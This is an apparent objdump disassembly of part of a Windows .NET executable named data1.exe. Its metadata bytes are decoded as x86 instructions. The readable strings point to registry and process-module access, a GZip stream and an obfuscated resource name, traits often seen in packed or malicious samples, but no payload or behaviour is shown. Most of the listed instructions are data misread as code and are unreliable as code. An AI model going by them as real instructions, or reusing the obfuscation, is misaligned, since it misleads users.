  406935:	0d 25 06 91 02       	or     $0x2910625,%eax
  40693a:	2f                   	das
  40693b:	0b e5                	or     %ebp,%esp
  40693d:	04 34                	add    $0x34,%al
  40693f:	00 4e 07             	add    %cl,0x7(%esi)
  406942:	12 00                	adc    (%eax),%al
  406944:	34 00                	xor    $0x0,%al
  406946:	1f                   	pop    %ds
  406947:	0d 4c 06 e9 01       	or     $0x1e9064c,%eax
  40694c:	28 0d 2c 03 81 02    	sub    %cl,0x281032c
  406952:	31 0d 56 06 34 00    	xor    %ecx,0x340656
  406958:	9f                   	lahf
  406959:	09 bf 03 34 00 aa    	or     %edi,-0x55ffcbfd(%edi)
  40695f:	0b 1a                	or     (%edx),%ebx
  406961:	00 34 00             	add    %dh,(%eax,%eax,1)
  406964:	ae                   	scas   %es:(%edi),%al
  406965:	09 c5                	or     %eax,%ebp
  406967:	03 34 00             	add    (%eax,%eax,1),%esi
  40696a:	a1 0b 5c 06 09       	mov    0x9065c0b,%eax
  40696f:	02 3a                	add    (%edx),%bh
  406971:	0d 1a 00 20 00       	or     $0x20001a,%eax
  406976:	0b 00                	or     (%eax),%eax
  406978:	8a 01                	mov    (%ecx),%al
  40697a:	2e 00 33             	add    %dh,%cs:(%ebx)
  40697d:	00 e2                	add    %ah,%dl
  40697f:	01 2e                	add    %ebp,(%esi)
  406981:	00 3b                	add    %bh,(%ebx)
  406983:	00 eb                	add    %ch,%bl
  406985:	01 2e                	add    %ebp,(%esi)
  406987:	00 43 00             	add    %al,0x0(%ebx)
  40698a:	0a 02                	or     (%edx),%al
  40698c:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  406990:	1a 02                	sbb    (%edx),%al
  406992:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  406996:	1a 02                	sbb    (%edx),%al
  406998:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  40699c:	1a 02                	sbb    (%edx),%al
  40699e:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4069a2:	0a 02                	or     (%edx),%al
  4069a4:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4069a8:	20 02                	and    %al,(%edx)
  4069aa:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4069ae:	1a 02                	sbb    (%edx),%al
  4069b0:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  4069b4:	1a 02                	sbb    (%edx),%al
  4069b6:	2e 00 83 00 3d 02 2e 	add    %al,%cs:0x2e023d00(%ebx)
  4069bd:	00 8b 00 67 02 2e    	add    %cl,0x2e026700(%ebx)
  4069c3:	00 93 00 74 02 2e    	add    %dl,0x2e027400(%ebx)
  4069c9:	00 9b 00 8a 01 40    	add    %bl,0x40018a00(%ebx)
  4069cf:	00 0b                	add    %cl,(%ebx)
  4069d1:	00 8a 01 80 00 0b    	add    %cl,0xb008001(%edx)
  4069d7:	00 8a 01 a0 00 0b    	add    %cl,0xb00a001(%edx)
  4069dd:	00 8a 01 c0 00 0b    	add    %cl,0xb00c001(%edx)
  4069e3:	00 8a 01 e0 00 0b    	add    %cl,0xb00e001(%edx)
  4069e9:	00 8a 01 00 01 0b    	add    %cl,0xb010001(%edx)
  4069ef:	00 8a 01 43 02 23    	add    %cl,0x23024301(%edx)
  4069f5:	00 9b 01 43 02 2b    	add    %bl,0x2b024301(%ebx)
  4069fb:	00 8a 01 07 00 46    	add    %cl,0x46000701(%edx)
  406a01:	00 0b                	add    %cl,(%ebx)
  406a03:	00 46 00             	add    %al,0x0(%esi)
  406a06:	c2 02 c6             	ret    $0xc602
  406a09:	02 cb                	add    %bl,%cl
  406a0b:	02 54 03 66          	add    0x66(%ebx,%eax,1),%dl
  406a0f:	03 83 03 de 03 ea    	add    -0x15fc21fd(%ebx),%eax
  406a15:	03 07                	add    (%edi),%eax
  406a17:	04 12                	add    $0x12,%al
  406a19:	04 5f                	add    $0x5f,%al
  406a1b:	04 05                	add    $0x5,%al
  406a1d:	05 11 05 16 05       	add    $0x5160511,%eax
  406a22:	33 05 3d 05 4a 05    	xor    0x54a053d,%eax
  406a28:	50                   	push   %eax
  406a29:	05 64 05 7a 05       	add    $0x57a0564,%eax
  406a2e:	94                   	xchg   %eax,%esp
  406a2f:	05 af 05 e6 05       	add    $0x5e605af,%eax
  406a34:	00 06                	add    %al,(%esi)
  406a36:	2d 06 63 06 70       	sub    $0x70066306,%eax
  406a3b:	06                   	push   %es
  406a3c:	7c 06                	jl     0x406a44
  406a3e:	04 00                	add    $0x0,%al
  406a40:	04 00                	add    $0x0,%al
  406a42:	76 00                	jbe    0x406a44
  406a44:	04 00                	add    $0x0,%al
  406a46:	06                   	push   %es
  406a47:	00 78 00             	add    %bh,0x0(%eax)
  406a4a:	04 00                	add    $0x0,%al
  406a4c:	08 00                	or     %al,(%eax)
  406a4e:	05 00 04 00 0a       	add    $0xa000400,%eax
  406a53:	00 7c 00 04          	add    %bh,0x4(%eax,%eax,1)
  406a57:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406a5a:	7a 00                	jp     0x406a5c
  406a5c:	04 00                	add    $0x0,%al
  406a5e:	0e                   	push   %cs
  406a5f:	00 07                	add    %al,(%edi)
  406a61:	00 04 00             	add    %al,(%eax,%eax,1)
  406a64:	10 00                	adc    %al,(%eax)
  406a66:	2e 00 21             	add    %ah,%cs:(%ecx)
  406a69:	00 2a                	add    %ch,(%edx)
  406a6b:	00 35 00 3f 00 4c    	add    %dh,0x4c003f00
  406a71:	00 8f 01 95 01 36    	add    %cl,0x36019501(%edi)
  406a77:	03 ad 03 24 04 46    	add    0x46042403(%ebp),%ebp
  406a7d:	06                   	push   %es
  406a7e:	00 01                	add    %al,(%ecx)
  406a80:	1d 00 96 07 04       	sbb    $0x4079600,%eax
  406a85:	00 41 01             	add    %al,0x1(%ecx)
  406a88:	1f                   	pop    %ds
  406a89:	00 a8 07 05 00 46    	add    %ch,0x46000507(%eax)
  406a8f:	01 65 00             	add    %esp,0x0(%ebp)
  406a92:	c3                   	ret
  406a93:	07                   	pop    %es
  406a94:	01 00                	add    %eax,(%eax)
  406a96:	46                   	inc    %esi
  406a97:	01 67 00             	add    %esp,0x0(%edi)
  406a9a:	cf                   	iret
  406a9b:	07                   	pop    %es
  406a9c:	01 00                	add    %eax,(%eax)
  406a9e:	46                   	inc    %esi
  406a9f:	01 69 00             	add    %ebp,0x0(%ecx)
  406aa2:	db 07                	fildl  (%edi)
  406aa4:	01 00                	add    %eax,(%eax)
  406aa6:	46                   	inc    %esi
  406aa7:	01 6b 00             	add    %ebp,0x0(%ebx)
  406aaa:	ea 07 01 00 46 01 6d 	ljmp   $0x6d01,$0x46000107
  406ab1:	00 f6                	add    %dh,%dh
  406ab3:	07                   	pop    %es
  406ab4:	01 00                	add    %eax,(%eax)
  406ab6:	46                   	inc    %esi
  406ab7:	01 6f 00             	add    %ebp,0x0(%edi)
  406aba:	09 08                	or     %ecx,(%eax)
  406abc:	01 00                	add    %eax,(%eax)
  406abe:	46                   	inc    %esi
  406abf:	01 71 00             	add    %esi,0x0(%ecx)
  406ac2:	17                   	pop    %ss
  406ac3:	08 02                	or     %al,(%edx)
  406ac5:	00 40 01             	add    %al,0x1(%eax)
  406ac8:	73 00                	jae    0x406aca
  406aca:	1e                   	push   %ds
  406acb:	08 03                	or     %al,(%ebx)
  406acd:	00 46 01             	add    %al,0x1(%esi)
  406ad0:	75 00                	jne    0x406ad2
  406ad2:	33 08                	xor    (%eax),%ecx
  406ad4:	01 00                	add    %eax,(%eax)
  406ad6:	04 80                	add    $0x80,%al
  406ad8:	00 00                	add    %al,(%eax)
  406ada:	01 00                	add    %eax,(%eax)
	...
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	00 00                	add    %al,(%eax)
  406aec:	04 00                	add    $0x0,%al
	...
  406af6:	00 00                	add    %al,(%eax)
  406af8:	01 00                	add    %eax,(%eax)
  406afa:	11 00                	adc    %eax,(%eax)
  406afc:	00 00                	add    %al,(%eax)
  406afe:	00 00                	add    %al,(%eax)
  406b00:	04 00                	add    $0x0,%al
	...
  406b0a:	00 00                	add    %al,(%eax)
  406b0c:	01 00                	add    %eax,(%eax)
  406b0e:	1a 00                	sbb    (%eax),%al
	...
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	00 00                	add    %al,(%eax)
  406b1c:	59                   	pop    %ecx
  406b1d:	00 00                	add    %al,(%eax)
  406b1f:	00 d8                	add    %bl,%al
  406b21:	03 00                	add    (%eax),%eax
  406b23:	00 02                	add    %al,(%edx)
  406b25:	00 00                	add    %al,(%eax)
  406b27:	00 73 00             	add    %dh,0x0(%ebx)
  406b2a:	00 00                	add    %al,(%eax)
  406b2c:	04 00                	add    $0x0,%al
  406b2e:	02 00                	add    (%eax),%al
  406b30:	06                   	push   %es
  406b31:	00 05 00 09 00 08    	add    %al,0x8000900
  406b37:	00 0a                	add    %cl,(%edx)
  406b39:	00 08                	add    %cl,(%eax)
  406b3b:	00 0e                	add    %cl,(%esi)
  406b3d:	00 0d 00 15 00 14    	add    %cl,0x14001500
  406b43:	00 16                	add    %dl,(%esi)
  406b45:	00 14 00             	add    %dl,(%eax,%eax,1)
  406b48:	17                   	pop    %ss
  406b49:	00 14 00             	add    %dl,(%eax,%eax,1)
  406b4c:	18 00                	sbb    %al,(%eax)
  406b4e:	14 00                	adc    $0x0,%al
  406b50:	19 00                	sbb    %eax,(%eax)
  406b52:	14 00                	adc    $0x0,%al
  406b54:	1a 00                	sbb    (%eax),%al
  406b56:	14 00                	adc    $0x0,%al
  406b58:	1b 00                	sbb    (%eax),%eax
  406b5a:	14 00                	adc    $0x0,%al
  406b5c:	1c 00                	sbb    $0x0,%al
  406b5e:	14 00                	adc    $0x0,%al
  406b60:	00 00                	add    %al,(%eax)
  406b62:	00 00                	add    %al,(%eax)
  406b64:	18 00                	sbb    %al,(%eax)
  406b66:	14 07                	adc    $0x7,%al
  406b68:	00 00                	add    %al,(%eax)
  406b6a:	00 00                	add    %al,(%eax)
  406b6c:	26 00 14 07          	add    %dl,%es:(%edi,%eax,1)
  406b70:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  406b74:	61                   	popa
  406b75:	31 00                	xor    %eax,(%eax)
  406b77:	64 61                	fs popa
  406b79:	74 61                	je     0x406bdc
  406b7b:	31 2e                	xor    %ebp,(%esi)
  406b7d:	65 78 65             	gs js  0x406be5
  406b80:	00 6d 73             	add    %ch,0x73(%ebp)
  406b83:	63 6f 72             	arpl   %ebp,0x72(%edi)
  406b86:	6c                   	insb   (%dx),%es:(%edi)
  406b87:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  406b8e:	65 6d                	gs insl (%dx),%es:(%edi)
  406b90:	00 6b 65             	add    %ch,0x65(%ebx)
  406b93:	72 6e                	jb     0x406c03
  406b95:	65 6c                	gs insb (%dx),%es:(%edi)
  406b97:	33 32                	xor    (%edx),%esi
  406b99:	00 6d 73             	add    %ch,0x73(%ebp)
  406b9c:	76 63                	jbe    0x406c01
  406b9e:	72 74                	jb     0x406c14
  406ba0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406ba3:	6c                   	insb   (%dx),%es:(%edi)
  406ba4:	00 70 73             	add    %dh,0x73(%eax)
  406ba7:	61                   	popa
  406ba8:	70 69                	jo     0x406c13
  406baa:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406bad:	6c                   	insb   (%dx),%es:(%edi)
  406bae:	00 6b 65             	add    %ch,0x65(%ebx)
  406bb1:	72 6e                	jb     0x406c21
  406bb3:	65 6c                	gs insb (%dx),%es:(%edi)
  406bb5:	33 32                	xor    (%edx),%esi
  406bb7:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406bba:	6c                   	insb   (%dx),%es:(%edi)
  406bbb:	00 4b 65             	add    %cl,0x65(%ebx)
  406bbe:	72 6e                	jb     0x406c2e
  406bc0:	65 6c                	gs insb (%dx),%es:(%edi)
  406bc2:	33 32                	xor    (%edx),%esi
  406bc4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406bc7:	6c                   	insb   (%dx),%es:(%edi)
  406bc8:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  406bcc:	61                   	popa
  406bcd:	31 2e                	xor    %ebp,(%esi)
  406bcf:	52                   	push   %edx
  406bd0:	65 73 6f             	gs jae 0x406c42
  406bd3:	75 72                	jne    0x406c47
  406bd5:	63 65 31             	arpl   %esp,0x31(%ebp)
  406bd8:	2e 72 65             	jb,pn  0x406c40
  406bdb:	73 6f                	jae    0x406c4c
  406bdd:	75 72                	jne    0x406c51
  406bdf:	63 65 73             	arpl   %esp,0x73(%ebp)
  406be2:	00 e2                	add    %ah,%dl
  406be4:	80 85 e2 80 87 e2 80 	addb   $0x80,-0x1d787f1e(%ebp)
  406beb:	81 e2 80 87 e2 80    	and    $0x80e28780,%edx
  406bf1:	88 e2                	mov    %ah,%dl
  406bf3:	80 86 e2 80 89 e2 80 	addb   $0x80,-0x1d767f1e(%esi)
  406bfa:	83 e2 80             	and    $0xffffff80,%edx
  406bfd:	80 00 52             	addb   $0x52,(%eax)
  406c00:	65 67 69 73 74 72 79 	imul   $0x4d007972,%gs:0x74(%bp,%di),%esi
  406c07:	00 4d 
  406c09:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406c10:	74 2e                	je     0x406c40
  406c12:	57                   	push   %edi
  406c13:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  406c1a:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  406c21:	65 
  406c22:	79 00                	jns    0x406c24
  406c24:	52                   	push   %edx
  406c25:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  406c2c:	56 61 
  406c2e:	6c                   	insb   (%dx),%es:(%edi)
  406c2f:	75 65                	jne    0x406c96
  406c31:	4b                   	dec    %ebx
  406c32:	69 6e 64 00 41 72 67 	imul   $0x67724100,0x64(%esi),%ebp
  406c39:	75 6d                	jne    0x406ca8
  406c3b:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c3d:	74 4f                	je     0x406c8e
  406c3f:	75 74                	jne    0x406cb5
  406c41:	4f                   	dec    %edi
  406c42:	66 52                	push   %dx
  406c44:	61                   	popa
  406c45:	6e                   	outsb  %ds:(%esi),(%dx)
  406c46:	67 65 45             	addr16 gs inc %ebp
  406c49:	78 63                	js     0x406cae
  406c4b:	65 70 74             	gs jo  0x406cc2
  406c4e:	69 6f 6e 00 41 72 72 	imul   $0x72724100,0x6e(%edi),%ebp
  406c55:	61                   	popa
  406c56:	79 00                	jns    0x406c58
  406c58:	42                   	inc    %edx
  406c59:	6f                   	outsl  %ds:(%esi),(%dx)
  406c5a:	6f                   	outsl  %ds:(%esi),(%dx)
  406c5b:	6c                   	insb   (%dx),%es:(%edi)
  406c5c:	65 61                	gs popa
  406c5e:	6e                   	outsb  %ds:(%esi),(%dx)
  406c5f:	00 42 75             	add    %al,0x75(%edx)
  406c62:	66 66 65 72 00       	data16 data16 gs jb 0x406c67
  406c67:	42                   	inc    %edx
  406c68:	79 74                	jns    0x406cde
  406c6a:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  406c6e:	61                   	popa
  406c6f:	72 00                	jb     0x406c71
  406c71:	47                   	inc    %edi
  406c72:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c74:	65 72 61             	gs jb  0x406cd8
  406c77:	74 65                	je     0x406cde
  406c79:	64 43                	fs inc %ebx
  406c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  406c7c:	64 65 41             	fs gs inc %ecx
  406c7f:	74 74                	je     0x406cf5
  406c81:	72 69                	jb     0x406cec
  406c83:	62 75 74             	bound  %esi,0x74(%ebp)
  406c86:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406c8a:	73 74                	jae    0x406d00
  406c8c:	65 6d                	gs insl (%dx),%es:(%edi)
  406c8e:	2e 43                	cs inc %ebx
  406c90:	6f                   	outsl  %ds:(%esi),(%dx)
  406c91:	64 65 44             	fs gs inc %esp
  406c94:	6f                   	outsl  %ds:(%esi),(%dx)
  406c95:	6d                   	insl   (%dx),%es:(%edi)
  406c96:	2e 43                	cs inc %ebx
  406c98:	6f                   	outsl  %ds:(%esi),(%dx)
  406c99:	6d                   	insl   (%dx),%es:(%edi)
  406c9a:	70 69                	jo     0x406d05
  406c9c:	6c                   	insb   (%dx),%es:(%edi)
  406c9d:	65 72 00             	gs jb  0x406ca0
  406ca0:	43                   	inc    %ebx
  406ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  406ca2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca3:	63 75 72             	arpl   %esi,0x72(%ebp)
  406ca6:	72 65                	jb     0x406d0d
  406ca8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca9:	74 44                	je     0x406cef
  406cab:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  406cb2:	72 79                	jb     0x406d2d
  406cb4:	60                   	pusha
  406cb5:	32 00                	xor    (%eax),%al
  406cb7:	53                   	push   %ebx
  406cb8:	79 73                	jns    0x406d2d
  406cba:	74 65                	je     0x406d21
  406cbc:	6d                   	insl   (%dx),%es:(%edi)
  406cbd:	2e 43                	cs inc %ebx
  406cbf:	6f                   	outsl  %ds:(%esi),(%dx)
  406cc0:	6c                   	insb   (%dx),%es:(%edi)
  406cc1:	6c                   	insb   (%dx),%es:(%edi)
  406cc2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406cc7:	6e                   	outsb  %ds:(%esi),(%dx)
  406cc8:	73 2e                	jae    0x406cf8
  406cca:	43                   	inc    %ebx
  406ccb:	6f                   	outsl  %ds:(%esi),(%dx)
  406ccc:	6e                   	outsb  %ds:(%esi),(%dx)
  406ccd:	63 75 72             	arpl   %esi,0x72(%ebp)
  406cd0:	72 65                	jb     0x406d37
  406cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd3:	74 00                	je     0x406cd5
  406cd5:	49                   	dec    %ecx
  406cd6:	45                   	inc    %ebp
  406cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd8:	75 6d                	jne    0x406d47
  406cda:	65 72 61             	gs jb  0x406d3e
  406cdd:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  406ce1:	31 00                	xor    %eax,(%eax)
  406ce3:	53                   	push   %ebx
  406ce4:	79 73                	jns    0x406d59
  406ce6:	74 65                	je     0x406d4d
  406ce8:	6d                   	insl   (%dx),%es:(%edi)
  406ce9:	2e 43                	cs inc %ebx
  406ceb:	6f                   	outsl  %ds:(%esi),(%dx)
  406cec:	6c                   	insb   (%dx),%es:(%edi)
  406ced:	6c                   	insb   (%dx),%es:(%edi)
  406cee:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  406cf4:	73 2e                	jae    0x406d24
  406cf6:	47                   	inc    %edi
  406cf7:	65 6e                	outsb  %gs:(%esi),(%dx)
  406cf9:	65 72 69             	gs jb  0x406d65
  406cfc:	63 00                	arpl   %eax,(%eax)
  406cfe:	4c                   	dec    %esp
  406cff:	69 73 74 60 31 00 49 	imul   $0x49003160,0x74(%ebx),%esi
  406d06:	45                   	inc    %ebp
  406d07:	6e                   	outsb  %ds:(%esi),(%dx)
  406d08:	75 6d                	jne    0x406d77
  406d0a:	65 72 61             	gs jb  0x406d6e
  406d0d:	74 6f                	je     0x406d7e
  406d0f:	72 00                	jb     0x406d11
  406d11:	53                   	push   %ebx
  406d12:	79 73                	jns    0x406d87
  406d14:	74 65                	je     0x406d7b
  406d16:	6d                   	insl   (%dx),%es:(%edi)
  406d17:	2e 43                	cs inc %ebx
  406d19:	6f                   	outsl  %ds:(%esi),(%dx)
  406d1a:	6c                   	insb   (%dx),%es:(%edi)
  406d1b:	6c                   	insb   (%dx),%es:(%edi)
  406d1c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406d21:	6e                   	outsb  %ds:(%esi),(%dx)
  406d22:	73 00                	jae    0x406d24
  406d24:	52                   	push   %edx
  406d25:	65 61                	gs popa
  406d27:	64 4f                	fs dec %edi
  406d29:	6e                   	outsb  %ds:(%esi),(%dx)
  406d2a:	6c                   	insb   (%dx),%es:(%edi)
  406d2b:	79 43                	jns    0x406d70
  406d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  406d2e:	6c                   	insb   (%dx),%es:(%edi)
  406d2f:	6c                   	insb   (%dx),%es:(%edi)
  406d30:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406d35:	6e                   	outsb  %ds:(%esi),(%dx)
  406d36:	42                   	inc    %edx
  406d37:	61                   	popa
  406d38:	73 65                	jae    0x406d9f
  406d3a:	00 43 6f             	add    %al,0x6f(%ebx)
  406d3d:	6e                   	outsb  %ds:(%esi),(%dx)
  406d3e:	73 6f                	jae    0x406daf
  406d40:	6c                   	insb   (%dx),%es:(%edi)
  406d41:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406d45:	6e                   	outsb  %ds:(%esi),(%dx)
  406d46:	76 65                	jbe    0x406dad
  406d48:	72 74                	jb     0x406dbe
  406d4a:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  406d4e:	61                   	popa
  406d4f:	52                   	push   %edx
  406d50:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  406d54:	76 65                	jbe    0x406dbb
  406d56:	64 45                	fs inc %ebp
  406d58:	76 65                	jbe    0x406dbf
  406d5a:	6e                   	outsb  %ds:(%esi),(%dx)
  406d5b:	74 41                	je     0x406d9e
  406d5d:	72 67                	jb     0x406dc6
  406d5f:	73 00                	jae    0x406d61
  406d61:	53                   	push   %ebx
  406d62:	79 73                	jns    0x406dd7
  406d64:	74 65                	je     0x406dcb
  406d66:	6d                   	insl   (%dx),%es:(%edi)
  406d67:	2e 44                	cs inc %esp
  406d69:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406d70:	69 63 73 00 44 61 74 	imul   $0x74614400,0x73(%ebx),%esp
  406d77:	61                   	popa
  406d78:	52                   	push   %edx
  406d79:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  406d7d:	76 65                	jbe    0x406de4
  406d7f:	64 45                	fs inc %ebp
  406d81:	76 65                	jbe    0x406de8
  406d83:	6e                   	outsb  %ds:(%esi),(%dx)
  406d84:	74 48                	je     0x406dce
  406d86:	61                   	popa
  406d87:	6e                   	outsb  %ds:(%esi),(%dx)
  406d88:	64 6c                	fs insb (%dx),%es:(%edi)
  406d8a:	65 72 00             	gs jb  0x406d8d
  406d8d:	44                   	inc    %esp
  406d8e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406d92:	67 65 72 00          	addr16 gs jb 0x406d96
  406d96:	44                   	inc    %esp
  406d97:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406d9b:	67 65 72 48          	addr16 gs jb 0x406de7
  406d9f:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  406da6:	74 
  406da7:	72 69                	jb     0x406e12
  406da9:	62 75 74             	bound  %esi,0x74(%ebp)
  406dac:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406db1:	75 67                	jne    0x406e1a
  406db3:	67 65 72 4e          	addr16 gs jb 0x406e05
  406db7:	6f                   	outsl  %ds:(%esi),(%dx)
  406db8:	6e                   	outsb  %ds:(%esi),(%dx)
  406db9:	55                   	push   %ebp
  406dba:	73 65                	jae    0x406e21
  406dbc:	72 43                	jb     0x406e01
  406dbe:	6f                   	outsl  %ds:(%esi),(%dx)
  406dbf:	64 65 41             	fs gs inc %ecx
  406dc2:	74 74                	je     0x406e38
  406dc4:	72 69                	jb     0x406e2f
  406dc6:	62 75 74             	bound  %esi,0x74(%ebp)
  406dc9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  406dcd:	6f                   	outsl  %ds:(%esi),(%dx)
  406dce:	63 65 73             	arpl   %esp,0x73(%ebp)
  406dd1:	73 00                	jae    0x406dd3
  406dd3:	50                   	push   %eax
  406dd4:	72 6f                	jb     0x406e45
  406dd6:	63 65 73             	arpl   %esp,0x73(%ebp)
  406dd9:	73 4d                	jae    0x406e28
  406ddb:	6f                   	outsl  %ds:(%esi),(%dx)
  406ddc:	64 75 6c             	fs jne 0x406e4b
  406ddf:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  406de3:	6f                   	outsl  %ds:(%esi),(%dx)
  406de4:	63 65 73             	arpl   %esp,0x73(%ebp)
  406de7:	73 4d                	jae    0x406e36
  406de9:	6f                   	outsl  %ds:(%esi),(%dx)
  406dea:	64 75 6c             	fs jne 0x406e59
  406ded:	65 43                	gs inc %ebx
  406def:	6f                   	outsl  %ds:(%esi),(%dx)
  406df0:	6c                   	insb   (%dx),%es:(%edi)
  406df1:	6c                   	insb   (%dx),%es:(%edi)
  406df2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406df7:	6e                   	outsb  %ds:(%esi),(%dx)
  406df8:	00 50 72             	add    %dl,0x72(%eax)
  406dfb:	6f                   	outsl  %ds:(%esi),(%dx)
  406dfc:	63 65 73             	arpl   %esp,0x73(%ebp)
  406dff:	73 53                	jae    0x406e54
  406e01:	74 61                	je     0x406e64
  406e03:	72 74                	jb     0x406e79
  406e05:	49                   	dec    %ecx
  406e06:	6e                   	outsb  %ds:(%esi),(%dx)
  406e07:	66 6f                	outsw  %ds:(%esi),(%dx)
  406e09:	00 53 74             	add    %dl,0x74(%ebx)
  406e0c:	61                   	popa
  406e0d:	63 6b 46             	arpl   %ebp,0x46(%ebx)
  406e10:	72 61                	jb     0x406e73
  406e12:	6d                   	insl   (%dx),%es:(%edi)
  406e13:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  406e17:	61                   	popa
  406e18:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  406e1b:	72 61                	jb     0x406e7e
  406e1d:	63 65 00             	arpl   %esp,0x0(%ebp)
  406e20:	45                   	inc    %ebp
  406e21:	6e                   	outsb  %ds:(%esi),(%dx)
  406e22:	75 6d                	jne    0x406e91
  406e24:	00 45 6e             	add    %al,0x6e(%ebp)
  406e27:	76 69                	jbe    0x406e92
  406e29:	72 6f                	jb     0x406e9a
  406e2b:	6e                   	outsb  %ds:(%esi),(%dx)
  406e2c:	6d                   	insl   (%dx),%es:(%edi)
  406e2d:	65 6e                	outsb  %gs:(%esi),(%dx)
  406e2f:	74 00                	je     0x406e31
  406e31:	53                   	push   %ebx
  406e32:	70 65                	jo     0x406e99
  406e34:	63 69 61             	arpl   %ebp,0x61(%ecx)
  406e37:	6c                   	insb   (%dx),%es:(%edi)
  406e38:	46                   	inc    %esi
  406e39:	6f                   	outsl  %ds:(%esi),(%dx)
  406e3a:	6c                   	insb   (%dx),%es:(%edi)
  406e3b:	64 65 72 00          	fs gs jb 0x406e3f
  406e3f:	45                   	inc    %ebp
  406e40:	78 63                	js     0x406ea5
  406e42:	65 70 74             	gs jo  0x406eb9
  406e45:	69 6f 6e 00 43 75 6c 	imul   $0x6c754300,0x6e(%edi),%ebp
  406e4c:	74 75                	je     0x406ec3
  406e4e:	72 65                	jb     0x406eb5
  406e50:	49                   	dec    %ecx
  406e51:	6e                   	outsb  %ds:(%esi),(%dx)
  406e52:	66 6f                	outsw  %ds:(%esi),(%dx)
  406e54:	00 53 79             	add    %dl,0x79(%ebx)
  406e57:	73 74                	jae    0x406ecd
  406e59:	65 6d                	gs insl (%dx),%es:(%edi)
  406e5b:	2e 47                	cs inc %edi
  406e5d:	6c                   	insb   (%dx),%es:(%edi)
  406e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e5f:	62 61 6c             	bound  %esp,0x6c(%ecx)
  406e62:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  406e69:	00 49 44             	add    %cl,0x44(%ecx)
  406e6c:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  406e73:	6c                   	insb   (%dx),%es:(%edi)
  406e74:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406e78:	6d                   	insl   (%dx),%es:(%edi)
  406e79:	70 72                	jo     0x406eed
  406e7b:	65 73 73             	gs jae 0x406ef1
  406e7e:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  406e85:	00 53 79             	add    %dl,0x79(%ebx)
  406e88:	73 74                	jae    0x406efe
  406e8a:	65 6d                	gs insl (%dx),%es:(%edi)
  406e8c:	2e 49                	cs dec %ecx
  406e8e:	4f                   	dec    %edi
  406e8f:	2e 43                	cs inc %ebx
  406e91:	6f                   	outsl  %ds:(%esi),(%dx)
  406e92:	6d                   	insl   (%dx),%es:(%edi)
  406e93:	70 72                	jo     0x406f07
  406e95:	65 73 73             	gs jae 0x406f0b
  406e98:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  406e9f:	70 53                	jo     0x406ef4
  406ea1:	74 72                	je     0x406f15
  406ea3:	65 61                	gs popa
  406ea5:	6d                   	insl   (%dx),%es:(%edi)
  406ea6:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  406eaa:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  406eaf:	79 00                	jns    0x406eb1
  406eb1:	53                   	push   %ebx
  406eb2:	79 73                	jns    0x406f27
